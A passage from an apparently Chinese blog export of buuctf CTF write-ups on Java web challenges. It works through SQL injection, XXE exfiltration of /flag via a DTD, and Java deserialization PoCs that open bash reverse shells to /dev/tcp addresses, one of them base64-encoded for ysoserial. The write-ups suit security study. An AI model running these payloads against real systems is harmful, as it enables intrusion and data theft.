获取数据库print(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA&quot;))# 获取数据库表print(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = &#x27;F4l9_D4t4B45e&#x27;&quot;))# 获取数据库表print(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = &#x27;F4l9_D4t4B45e&#x27; AND TABLE_NAME = &#x27;F4l9_t4b1e&#x27; &quot;))# 获取表中内容print(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e&quot;))","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"buuctf","slug":"buuctf","permalink":"http://www.moonback.xyz/tags/buuctf/"},{"name":"sql注入","slug":"sql注入","permalink":"http://www.moonback.xyz/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"buuctf刷题-Java篇","slug":"buuctf刷题-Java篇","date":"2020-01-16T06:11:08.000Z","updated":"2021-03-18T07:45:26.640Z","comments":true,"path":"2020/01/16/buuctf刷题-Java篇/","link":"","permalink":"http://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-Java%E7%AF%87/","excerpt":"本篇博客主要记录了buuctf上web部分Java相关题目的writeup！持续更新！","text":"本篇博客主要记录了buuctf上web部分Java相关题目的writeup！持续更新！ [网鼎杯 2020 青龙组]filejavajava web项目目录： 12345webapps # 含Web应用的程序(JSP、Servlet和JavaBean等)webapps/META-INF/ #存放一些meta information相关的文件webapps/WEB-INF/classes/ #用于存放java字节码文件webapps/WEB-INF/lib/ #用于存放该工程用到的库，例如servlet-api.jar等等webapps/WEB-INF/web.xml #web工程的配置文件，完成用户请求的逻辑名称到真正的servlet类的映射 writeup查看源码发现提示flag在/flag,浏览发现可以上传文件，第一时间想到上传jsp webshell，但是不知道路径，上传完之后发现可以下载，这里就存在个任意文件下载 试着去读WEB-INF/web.xml 根据这个包的路径去下载.class文件，由于这个是字节码文件，我们需要反编译一下，发现 利用EXCEL进行XXE攻击：https://xz.aliyun.com/t/3741 我们就可以xxe了，如下构造： vps上的test.dtd： 12&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;127.0.0.1:9001?p&#x3D;%file;&#39;&gt;&quot;&gt; 最后上传以类似于excel-1.xlsx的名字上传，就能收到flag了 [RoarCTF 2019]Easy Javawriteup这题相对于前一题就比较简单了 打开是一个登陆页面，暴力破解发现密码是admin888，登陆进去提示flag不在这 登陆页面有个help，打开提示java.io.FileNotFoundException，猜测应该是读文件的 直接访问/help.docx，发现可以把文件下载下来，猜测可以任意文件下载，但GET不能，不清楚为啥 读下WEB-INF/web.xml ，看到 读下源码WEB-INF/classes/com/wm/ctf/FlagController.class base64解密就能得到flag，也可以反编译一下看下代码 [网鼎杯 2020 朱雀组]Think Javawriteup题目地址：https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84]Think%20Java buu环境一直起不起来 去ctfhub了 有源码 jd-gui反编译class文件 Test.class： 123456789101112131415161718192021222324252627import cn.abc.common.bean.ResponseCode;import cn.abc.common.bean.ResponseResult;import cn.abc.common.security.annotation.Access;import cn.abc.core.sqldict.SqlDict;import cn.abc.core.sqldict.Table;import io.swagger.annotations.ApiOperation;import java.io.IOException;import java.util.List;import org.springframework.web.bind.annotation.CrossOrigin;import org.springframework.web.bind.annotation.PostMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;@CrossOrigin@RestController@RequestMapping(&#123;&quot;/common/test&quot;&#125;)public class Test&#123; @PostMapping(&#123;&quot;/sqlDict&quot;&#125;) @Access @ApiOperation(&quot;为了开发方便对应数据库字典查询&quot;) public ResponseResult sqlDict(String dbName) throws IOException &#123; List&lt;Table&gt; tables = SqlDict.getTableData(dbName, &quot;root&quot;, &quot;abc@12345&quot;); return ResponseResult.e(ResponseCode.OK, tables); &#125;&#125; 说下这几个注解都是啥意思： @CrossOrigin 防止跨域 springMVC的版本要在4.2或以上版本才支持 @RestController 方法返回的是json格式数据，而不是跳转页面使用该注解 @RequestMapping 定义路由规则 {}表示多个路径 这里只有一个 @PostMapping 指定处理POST方法的路由 @ApiOperation 使用于在SwaggerAPI文档方法上，表示一个http请求的操作 一个参数表示方法描述 SqlDict.class： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485package sqldict;import cn.abc.core.sqldict.Row;import cn.abc.core.sqldict.SqlDict;import cn.abc.core.sqldict.Table;import java.sql.Connection;import java.sql.DatabaseMetaData;import java.sql.DriverManager;import java.sql.ResultSet;import java.sql.SQLException;import java.sql.Statement;import java.util.List;public class SqlDict &#123; public static Connection getConnection(String dbName, String user, String pass) &#123; Connection conn = null; try &#123; Class.forName(&quot;com.mysql.jdbc.Driver&quot;); if (dbName != null &amp;&amp; !dbName.equals(&quot;&quot;)) &#123; dbName = &quot;jdbc:mysql://mysqldbserver:3306/&quot; + dbName; &#125; else &#123; dbName = &quot;jdbc:mysql://mysqldbserver:3306/myapp&quot;; &#125; if (user == null || dbName.equals(&quot;&quot;)) &#123; user = &quot;root&quot;; &#125; if (pass == null || dbName.equals(&quot;&quot;)) &#123; pass = &quot;abc@12345&quot;; &#125; conn = DriverManager.getConnection(dbName, user, pass); &#125; catch (ClassNotFoundException var5) &#123; var5.printStackTrace(); &#125; catch (SQLException var6) &#123; var6.printStackTrace(); &#125; return conn; &#125; public static List&lt;Table&gt; getTableData(String dbName, String user, String pass) &#123; List&lt;Table&gt; Tables = new ArrayList&lt;Table&gt;(); Connection conn = getConnection(dbName, user, pass); String TableName = &quot;&quot;; try &#123; Statement stmt = conn.createStatement(); DatabaseMetaData metaData = conn.getMetaData(); ResultSet tableNames = metaData.getTables((String)null, (String)null, (String)null, new String[] &#123; &quot;TABLE&quot; &#125;); while (tableNames.next()) &#123; TableName = tableNames.getString(3); Table table = new Table(); String sql = &quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;&quot; + dbName + &quot;&#x27; and table_name=&#x27;&quot; + TableName + &quot;&#x27;;&quot;; ResultSet rs = stmt.executeQuery(sql); while (rs.next()) &#123; table.setTableDescribe(rs.getString(&quot;TABLE_COMMENT&quot;)); &#125; table.setTableName(TableName); ResultSet data = metaData.getColumns(conn.getCatalog(), (String)null, TableName, &quot;&quot;); ResultSet rs2 = metaData.getPrimaryKeys(conn.getCatalog(), (String)null, TableName); String PK; for (PK = &quot;&quot;; rs2.next(); PK = rs2.getString(4)); while (data.next()) &#123; Row row = new Row(data.getString(&quot;COLUMN_NAME&quot;), data.getString(&quot;TYPE_NAME&quot;), data.getString(&quot;COLUMN_DEF&quot;), data.getString(&quot;NULLABLE&quot;).equals(&quot;1&quot;) ? &quot;YES&quot; : &quot;NO&quot;, data.getString(&quot;IS_AUTOINCREMENT&quot;), data.getString(&quot;REMARKS&quot;), data.getString(&quot;COLUMN_NAME&quot;).equals(PK) ? &quot;true&quot; : null, data.getString(&quot;COLUMN_SIZE&quot;)); table.list.add(row); &#125; Tables.add(table); &#125; &#125; catch (SQLException var16) &#123; var16.printStackTrace(); &#125; return Tables; &#125;&#125; 通过源吗可知项目和swagger相关 看下有没有swagger信息泄露 1swagger-ui.html 访问发现有三个api 再看下Test.class 我们可以控制dbName参数 进行sql注入 123dbName = &quot;jdbc:mysql://mysqldbserver:3306/&quot; + dbName;...String sql = &quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;&quot; + dbName + &quot;&#x27; and table_name=&#x27;&quot; + TableName + &quot;&#x27;;&quot;; 首先我们进行sql注入的语句不能影响到jdbc连接 1jdbc:mysql://localhost:3306/数据库名?user=用户名&amp;password=密码&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;serverTimezone=GMT 可以使用?作为参数 1myapp?a=&#x27; union select 1 # 此时jdbc就是 1jdbc:mysql://mysqldbserver:3306/myapp?a=&#x27; union select 1 # 除此之外还可以使用井号 payload: 1myapp#&#x27; union select 1# 直接联合查询 123456# 查表myapp#&#x27; union select group_concat(table_name) from information_schema.tables where table_schema=database()## 查字段myapp#&#x27; union select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;user&#x27;## 查内容myapp#&#x27; union select group_concat(id,0x20,name,0x20,pwd) from user# 有密码就登陆试试 直接在swagger-ui就能发包 点击Try it out 抓包看下 访问/common/user/current 带上下面的认证 发现可以访问到数据 1Authorization: Bearer ... 那串字符串看着像base64加密的 解密下 序列化数据 标志： 以rO0AB开头 =&gt; Java序列化数据的base64加密 以aced开头 =&gt; Java序列化数据的16进制编码 可以使用burp插件检查反序列化：https://github.com/federicodotta/Java-Deserialization-Scanner 可以配置一下ysoserial的路径 Exploiting的时候需要使用 直接反弹shell 使用：http://www.jackson-t.ca/runtime-exec-payloads.html ysoserial生成payload并且base64编码： 1java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDMuMTUyLjEzMi4xNi85MDAwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; | base64 -w0 [V&amp;N2020 公开赛]EasySpringMVCwriteup题目地址：https://buuoj.cn/challenges#[V&amp;N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B]EasySpringMVC jd-gui反编译class文件 PictureController.class： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182package com.controller;import com.tools.ClientInfo;import java.io.File;import java.io.FileInputStream;import java.io.InputStream;import javax.servlet.ServletOutputStream;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import org.apache.commons.fileupload.disk.DiskFileItem;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.multipart.MultipartFile;import org.springframework.web.multipart.commons.CommonsMultipartFile;@Controllerpublic class PictureController&#123; @RequestMapping(&#123;&quot;/showpic.form&quot;&#125;) public String index(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String file) throws Exception &#123; if (file == null) file = &quot;showpic.jsp&quot;; String[] attribute = file.split(&quot;\\\\.&quot;); String suffix = attribute[attribute.length - 1]; if (!suffix.equals(&quot;jsp&quot;)) &#123; boolean isadmin = ((ClientInfo)httpServletRequest.getSession().getAttribute(&quot;cinfo&quot;)).getName().equals(&quot;admin&quot;); if (!isadmin &amp;&amp; (!suffix.equals(&quot;jpg&quot;) || !suffix.equals(&quot;gif&quot;))) &#123; return &quot;onlypic&quot;; &#125; show(httpServletRequest, httpServletResponse, file); return &quot;showpic&quot;; &#125; StringBuilder stringBuilder = new StringBuilder(); for (int i = 0; i &lt; attribute.length - 1; i++) &#123; stringBuilder.append(attribute[i]); &#125; String jspFile = stringBuilder.toString(); int unixSep = jspFile.lastIndexOf(&#x27;/&#x27;); int winSep = jspFile.lastIndexOf(&#x27;\\\\&#x27;); int pos = (winSep &gt; unixSep) ? winSep : unixSep; jspFile = (pos != -1) ? jspFile.substring(pos + 1) : jspFile; if (jspFile.equals(&quot;&quot;)) &#123; jspFile = &quot;showpic&quot;; &#125; return jspFile; &#125; private void show(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String filename) throws Exception &#123; httpServletResponse.setContentType(&quot;image/jpeg&quot;); InputStream in = httpServletRequest.getServletContext().getResourceAsStream(&quot;/WEB-INF/resource/&quot; + filename); if (in == null) &#123; in = new FileInputStream(filename); &#125; ServletOutputStream servletOutputStream = httpServletResponse.getOutputStream(); byte[] b = new byte[1024]; while (in.read(b) != -1) &#123; servletOutputStream.write(b); &#125; in.close(); servletOutputStream.flush(); servletOutputStream.close(); &#125; @RequestMapping(&#123;&quot;/uploadpic.form&quot;&#125;) public String upload(MultipartFile file, HttpServletRequest request, HttpServletResponse response) throws Exception &#123; ClientInfo cinfo = (ClientInfo)request.getSession().getAttribute(&quot;cinfo&quot;); if (!cinfo.getGroup().equals(&quot;webmanager&quot;)) return &quot;notaccess&quot;; if (file == null) &#123; return &quot;uploadpic&quot;; &#125; String originalFilename = ((DiskFileItem)((CommonsMultipartFile)file).getFileItem()).getName(); String realPath = request.getSession().getServletContext().getRealPath(&quot;/WEB-INF/resource/&quot;); String path = realPath + originalFilename; file.transferTo(new File(path)); request.getSession().setAttribute(&quot;newpicfile&quot;, path); return &quot;uploadpic&quot;; &#125;&#125; ClentInfoFilter.class：这个主要记录了生成cookie的一些信息 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677package com.filters;import com.tools.ClientInfo;import com.tools.Tools;import java.io.IOException;import java.util.Base64;import javax.servlet.Filter;import javax.servlet.FilterChain;import javax.servlet.FilterConfig;import javax.servlet.ServletException;import javax.servlet.ServletRequest;import javax.servlet.ServletResponse;import javax.servlet.http.Cookie;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;public class ClentInfoFilter implements Filter &#123; public void init(FilterConfig fcg) &#123;&#125; public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123; Cookie[] cookies = ((HttpServletRequest)request).getCookies(); boolean exist = false; Cookie cookie = null; if (cookies != null) &#123; for (Cookie c : cookies) &#123; if (c.getName().equals(&quot;cinfo&quot;)) &#123; exist = true; cookie = c; break; &#125; &#125; &#125; if (exist) &#123; String b64 = cookie.getValue(); Base64.Decoder decoder = Base64.getDecoder(); byte[] bytes = decoder.decode(b64); ClientInfo cinfo = null; if (b64.equals(&quot;&quot;) || bytes == null) &#123; cinfo = new ClientInfo(&quot;Anonymous&quot;, &quot;normal&quot;, ((HttpServletRequest)request).getRequestedSessionId()); Base64.Encoder encoder = Base64.getEncoder(); try &#123; bytes = Tools.create(cinfo); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; cookie.setValue(encoder.encodeToString(bytes)); &#125; else &#123; try &#123; cinfo = (ClientInfo)Tools.parse(bytes); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; ((HttpServletRequest)request).getSession().setAttribute(&quot;cinfo&quot;, cinfo); &#125; else &#123; Base64.Encoder encoder = Base64.getEncoder(); try &#123; ClientInfo cinfo = new ClientInfo(&quot;Anonymous&quot;, &quot;normal&quot;, ((HttpServletRequest)request).getRequestedSessionId()); byte[] bytes = Tools.create(cinfo); cookie = new Cookie(&quot;cinfo&quot;, encoder.encodeToString(bytes)); cookie.setMaxAge(86400); ((HttpServletResponse)response).addCookie(cookie); ((HttpServletRequest)request).getSession().setAttribute(&quot;cinfo&quot;, cinfo); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; chain.doFilter(request, response); &#125; public void destroy() &#123;&#125;&#125; 这里面调用了Tools.class 12345678910111213141516171819202122232425package com.tools;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;public class Tools implements Serializable &#123; private static final long serialVersionUID = 1L; public static Object parse(byte[] bytes) throws Exception &#123; ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes)); return ois.readObject(); &#125; private String testCall; public static byte[] create(Object obj) throws Exception &#123; ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(bos); outputStream.writeObject(obj); return bos.toByteArray(); &#125; private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123; Object obj = in.readObject(); (new ProcessBuilder((String[])obj)).start(); &#125;&#125; 很明显了 cookie里设置的是序列化字符串的base64的值 抓包也能看出来 并且这里又重写了readObject方法 留了个后门 1(new ProcessBuilder((String[])obj)).start(); 序列化的是一个Tools才能成功调用重写的readObject方法 poc: 1234567891011121314import com.tools.Tools;import java.util.Base64;public class test &#123; public static void main(String[] args) throws Exception&#123; String[] cmd = &#123;&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/1.1.1.1/9000 0&gt;&amp;1&quot;&#125;; Tools tool = new Tools(); tool.setTestCall(cmd); byte[] bytes = tool.create(tool); Base64.Encoder encoder = Base64.getEncoder(); System.out.println(encoder.encodeToString(bytes)); tool.parse(bytes); &#125;&#125; 直接设置TestCall为payload 除此之外还可以在Tools类里加一个 这样就不需要调用set方法赋值了 123private void writeObject(ObjectOutputStream out) throws IOException&#123; out.writeObject(new String[]&#123;&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/1.1.1.1/9000 0&gt;&amp;1&quot;&#125;;);&#125; 不懂之处： 为什么调用setTestCall设置payload 为什么随便设置类里面任意一个参数也行 readObject到底调用了几次 类型改变为啥没有问题 个人理解：readObject会读取writeObject写入的内容 并且按照顺序读取 相当于一个队列 即先进先出 测试代码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package com.tools;import java.io.*;public class Tools implements Serializable &#123; private static final long serialVersionUID = 1L; private String[] testCall; private String[] aaa; public void setTestCall(String[] testCall) &#123; this.testCall = testCall; &#125; public void setAaa(String[] aaa) &#123; this.aaa = aaa; &#125; public static byte[] create(Object obj) throws Exception &#123; ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(bos); outputStream.writeObject(obj); return bos.toByteArray(); &#125; public static Object parse(byte[] bytes) throws Exception &#123; ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes)); return ois.readObject(); &#125; private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123; Object obj1 = in.readObject(); for(String s:(String[])obj1)&#123; System.out.print(s+&quot; &quot;); &#125; System.out.println(); Object obj2 = in.readObject(); for(String s:(String[])obj2)&#123; System.out.print(s+&quot; &quot;); &#125; System.out.println(); Object obj3 = in.readObject(); for(String s:(String[])obj3)&#123; System.out.print(s+&quot; &quot;); &#125; &#125; private void writeObject(ObjectOutputStream out) throws IOException&#123; out.writeObject(new String[]&#123;&quot;aaa&quot;&#125;); out.writeObject(new String[]&#123;&quot;zzz&quot;&#125;); out.writeObject(new String[]&#123;&quot;ddd&quot;&#125;); &#125;&#125; test.java： 123456789import com.tools.Tools;public class test &#123; public static void main(String[] args) throws Exception&#123; Tools tool = new Tools(); byte[] bytes = tool.create(tool); tool.parse(bytes); &#125;&#125; 运行结果： 123aaa zzz ddd 再看使用set的这种方式 这种就不一样了 测试代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package com.tools;import java.io.*;public class Tools implements Serializable &#123; private static final long serialVersionUID = 1L; private String[] qqq; private String[] aaa; private String[] zzz; public void setQqq(String[] qqq) &#123; this.qqq = qqq; &#125; public void setAaa(String[] aaa) &#123; this.aaa = aaa; &#125; public void setZzz(String[] zzz) &#123; this.zzz = zzz; &#125; public static byte[] create(Object obj) throws Exception &#123; ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(bos); outputStream.writeObject(obj); return bos.toByteArray(); &#125; public static Object parse(byte[] bytes) throws Exception &#123; ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes)); return ois.readObject(); &#125; private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123; Object obj1 = in.readObject(); for(String s:(String[])obj1)&#123; System.out.print(s+&quot; &quot;); &#125; System.out.println(); Object obj2 = in.readObject(); for(String s:(String[])obj2)&#123; System.out.print(s+&quot; &quot;); &#125; System.out.println(); Object obj3 = in.readObject(); for(String s:(String[])obj3)&#123; System.out.print(s+&quot; &quot;); &#125; &#125;&#125; test.java: 12345678910111213141516import com.tools.Tools;public class test &#123; public static void main(String[] args) throws Exception&#123; String[] qqq = &#123;&quot;qqq&quot;&#125;; String[] aaa = &#123;&quot;aaa&quot;&#125;; String[] zzz = &#123;&quot;zzz&quot;&#125;; Tools tool = new Tools(); tool.setZzz(zzz); tool.setQqq(qqq); tool.setAaa(aaa); byte[] bytes = tool.create(tool); tool.parse(bytes); &#125;&#125; 输出结果： 123aaa qqq zzz 由此发现 使用set这种方式 是经过排序的 Java序列化对字段进行封装时 会按原始和非原始数据类型排序 现在测下第三种情况 两者混用会怎末样？ 测试代码 12345678910111213141516171819202122232425262728293031323334353637383940414243package com.tools;import java.io.*;public class Tools implements Serializable &#123; private static final long serialVersionUID = 1L; private String[] zzz; public void setZzz(String[] zzz) &#123; this.zzz = zzz; &#125; public static byte[] create(Object obj) throws Exception &#123; ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(bos); outputStream.writeObject(obj); return bos.toByteArray(); &#125; public static Object parse(byte[] bytes) throws Exception &#123; ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes)); return ois.readObject(); &#125; private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123; Object obj1 = in.readObject(); for(String s:(String[])obj1)&#123; System.out.print(s+&quot; &quot;); &#125; System.out.println(); Object obj2 = in.readObject(); for(String s:(String[])obj2)&#123; System.out.print(s+&quot; &quot;); &#125; System.out.println(); Object obj3 = in.readObject(); for(String s:(String[])obj3)&#123; System.out.print(s+&quot; &quot;); &#125; &#125; private void writeObject(ObjectOutputStream out) throws IOException&#123; out.writeObject(new String[]&#123;&quot;ddd&quot;&#125;); out.writeObject(new String[]&#123;&quot;aaa&quot;&#125;); &#125;&#125; test.java 1234567891011import com.tools.Tools;public class test &#123; public static void main(String[] args) throws Exception&#123; String[] zzz = &#123;&quot;zzz&quot;&#125;; Tools tool = new Tools(); tool.setZzz(zzz); byte[] bytes = tool.create(tool); tool.parse(bytes); &#125;&#125; 输出： 12ddd aaa 只会输出writeObject写入的内容 总结： 只有writeObject的情况下 readObject会按顺序读取writeObject写入的内容 使用set方法对对象赋值后序列化 readObject会按照排序顺序读取写入的内容 两者混用 readObject只会按顺序读取出writeObject写入的内容 所以 对于这道题 不删除Tools类testCall属性的话 就有另外一个poc： 12345678910111213import com.tools.Tools;import java.util.Base64;public class test &#123; public static void main(String[] args) throws Exception&#123; String[] cmd = &#123;&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/1.1.1.1/9000 0&gt;&amp;1&quot;&#125;; Tools tool = new Tools(); tool.setAaa(cmd); byte[] bytes = tool.create(tool); Base64.Encoder encoder = Base64.getEncoder(); System.out.println(encoder.encodeToString(bytes)); &#125;&#125; 但是 这样就不行 因为会进行排序 首先获得的是testCall属性的值 12345678910111213import com.tools.Tools;import java.util.Base64;public class test &#123; public static void main(String[] args) throws Exception&#123; String[] cmd = &#123;&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/1.1.1.1/9000 0&gt;&amp;1&quot;&#125;; Tools tool = new Tools(); tool.setZzz(cmd); byte[] bytes = tool.create(tool); Base64.Encoder encoder = Base64.getEncoder(); System.out.println(encoder.encodeToString(bytes)); &#125;&#125; 当然 如果删除testCall属性 那随便什么名字都行了 [羊城杯 2020]A Piece Of Javawriteupjar包 直接改成zip后缀 解压 导入idea MainController.class： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283package gdufs.challenge.web.controller;import gdufs.challenge.web.model.Info;import gdufs.challenge.web.model.UserInfo;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.util.Base64;import javax.servlet.http.Cookie;import javax.servlet.http.HttpServletResponse;import org.nibblesec.tools.SerialKiller;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.CookieValue;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.PostMapping;import org.springframework.web.bind.annotation.RequestParam;@Controllerpublic class MainController &#123; public MainController() &#123; &#125; @GetMapping(&#123;&quot;/index&quot;&#125;) public String index(@CookieValue(value = &quot;data&quot;,required = false) String cookieData) &#123; return cookieData != null &amp;&amp; !cookieData.equals(&quot;&quot;) ? &quot;redirect:/hello&quot; : &quot;index&quot;; &#125; @PostMapping(&#123;&quot;/index&quot;&#125;) public String index(@RequestParam(&quot;username&quot;) String username, @RequestParam(&quot;password&quot;) String password, HttpServletResponse response) &#123; UserInfo userinfo = new UserInfo(); userinfo.setUsername(username); userinfo.setPassword(password); Cookie cookie = new Cookie(&quot;data&quot;, this.serialize(userinfo)); cookie.setMaxAge(2592000); response.addCookie(cookie); return &quot;redirect:/hello&quot;; &#125; @GetMapping(&#123;&quot;/hello&quot;&#125;) public String hello(@CookieValue(value = &quot;data&quot;,required = false) String cookieData, Model model) &#123; if (cookieData != null &amp;&amp; !cookieData.equals(&quot;&quot;)) &#123; Info info = (Info)this.deserialize(cookieData); if (info != null) &#123; model.addAttribute(&quot;info&quot;, info.getAllInfo()); &#125; return &quot;hello&quot;; &#125; else &#123; return &quot;redirect:/index&quot;; &#125; &#125; private String serialize(Object obj) &#123; ByteArrayOutputStream baos = new ByteArrayOutputStream(); try &#123; ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(obj); oos.close(); &#125; catch (Exception var4) &#123; var4.printStackTrace(); return null; &#125; return new String(Base64.getEncoder().encode(baos.toByteArray())); &#125; private Object deserialize(String base64data) &#123; ByteArrayInputStream bais = new ByteArrayInputStream(Base64.getDecoder().decode(base64data)); try &#123; ObjectInputStream ois = new SerialKiller(bais, &quot;serialkiller.conf&quot;); Object obj = ois.readObject(); ois.close(); return obj; &#125; catch (Exception var5) &#123; var5.printStackTrace(); return null; &#125; &#125;&#125; 主要代码也比较简单 /index路由接收username password两个参数 登陆后会把用户信息序列化保存在cookie里 /hello路由会反序列化cookie里面的信息 看了下lib目录下的依赖 看到了CC 刚好是有漏洞的版本 值得关注的是 反序列化使用了SerialKiller 搜了下这是个啥 项目地址：https://github.com/ikkisoft/SerialKiller 看下对应的配置文件 白名单 只能使用gdufs和java.lang包下的类 看到有个DatabaseInfo类 并且jdbc可控 有没有可能是mysql本地任意文件读取 但是反序列化只是反序列化 并没有方法执行啊 再看下InfoInvocationHandler.class 1234567891011121314151617181920212223package gdufs.challenge.web.invocation;import gdufs.challenge.web.model.Info;import java.io.Serializable;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;public class InfoInvocationHandler implements InvocationHandler, Serializable &#123; private Info info; public InfoInvocationHandler(Info info) &#123; this.info = info; &#125; public Object invoke(Object proxy, Method method, Object[] args) &#123; try &#123; return method.getName().equals(&quot;getAllInfo&quot;) &amp;&amp; !this.info.checkAllInfo() ? null : method.invoke(this.info, args); &#125; catch (Exception var5) &#123; var5.printStackTrace(); return null; &#125; &#125;&#125; 这个类是对info接口的动态代理 在调用代理对象方法的时候会调动代理类的invoke方法 反序列化的时候先进行类型转换 然后调用info.getAllInfo() 将DataBaseInfo实例 封装进Proxy类 poc: 123456789101112131415161718192021222324252627import gdufs.challenge.web.invocation.InfoInvocationHandler;import gdufs.challenge.web.model.DatabaseInfo;import gdufs.challenge.web.model.Info;import java.io.ByteArrayOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Proxy;import java.util.Base64;public class test &#123; public static void main(String[] args) throws Exception&#123; DatabaseInfo obj = new DatabaseInfo(); obj.setHost(&quot;1.1.1.1&quot;); obj.setPort(&quot;3307&quot;); obj.setUsername(&quot;root&quot;); obj.setPassword(&quot;root&amp;allowLoadLocalInfile=true&quot;); ClassLoader classLoader = obj.getClass().getClassLoader(); Class[] interfaces = obj.getClass().getInterfaces(); InfoInvocationHandler infoInvocationHandler = new InfoInvocationHandler(obj); Info proxy = (Info) Proxy.newProxyInstance(classLoader,interfaces,infoInvocationHandler); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(bos); outputStream.writeObject(proxy); byte[] bytes = bos.toByteArray(); Base64.Encoder encoder = Base64.getEncoder(); System.out.println(encoder.encodeToString(bytes)); &#125;&#125; 在执行InfoInvocationHandler.invoke方法中 调用了this.info.checkAllInfo() 在DatabaseInfo.checkAllInfo方法中执行了connect方法 jdbc连接可控 mysql客户端任意文件读取 注意加上 1allowLoadLocalInfile&#x3D;true 这还不够 我们需要getshell jdbc反序列化 原理参考： https://www.anquanke.com/post/id/203086 https://xz.aliyun.com/t/8159 https://github.com/fnmsd/MySQL_Fake_Server 大概意思就是JDBC在连接的时候会执行 1SHOW SESSION STATUS 会反序列化查询的返回集 具体流程调试参考：https://daybr4ak.github.io/2020/07/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/ 这里使用的是：https://github.com/rmb122/rogue_mysql_server 同样使用网站生成反弹shell的payload:http://www.jackson-t.ca/runtime-exec-payloads.html 其实替换下base64那串就行 1bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDMuMTUyLjEzMi4xNi85MDAwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; 看下配置文件 这是用的是CC7 CC5貌似也行 注意poc加上了 123456789101112131415161718192021222324252627import gdufs.challenge.web.invocation.InfoInvocationHandler;import gdufs.challenge.web.model.DatabaseInfo;import gdufs.challenge.web.model.Info;import java.io.ByteArrayOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Proxy;import java.util.Base64;public class test &#123; public static void 